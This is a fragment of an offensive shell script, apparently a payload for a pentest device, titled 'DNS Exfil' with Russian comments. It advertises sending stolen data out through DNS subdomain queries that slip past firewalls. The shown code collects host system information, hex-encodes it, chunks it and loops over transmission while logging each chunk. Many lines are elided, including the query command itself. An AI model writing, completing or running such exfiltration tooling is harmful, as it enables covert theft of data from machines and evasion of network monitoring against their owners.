...
# Title: DNS Exfil
# Author: NullSec
# Description: Эксфильтрация данных через DNS-туннелирование

# FIX: Путь для выполнения в UI и fallback-функции
...
PROMPT "DNS ЭКСФИЛЬТРАЦИЯ

Эксфильтрация данных через DNS-запросы.
Кодирует данные в поддоменные запросы,
проходящие мимо большинства брандмауэров.
    ...
    4) # Системная информация
        {
            ...
            echo "Имя узла: $(cat /proc/sys/kernel/hostname)"
            echo "Дата: $(date)"
            echo "Аптайм: $(uptime)"
            echo "Интерфейсы:"
...
SPINNER_START "Эксфильтрация через DNS..."

# Кодируем данные в hex и разбиваем на чанки
...
while [ $SENT -lt $HEX_LEN ]; do
    ...
    if [ $? -ne 0 ]; then
        ERRORS=$((ERRORS + 1))
        echo "[$SEQ] ОШИБКА: $QUERY" >> "$EXFIL_LOG"
    else
        echo "[$SEQ] ОК: ${CHUNK:0:16}..." >> "$EXFIL_LOG"
    fi
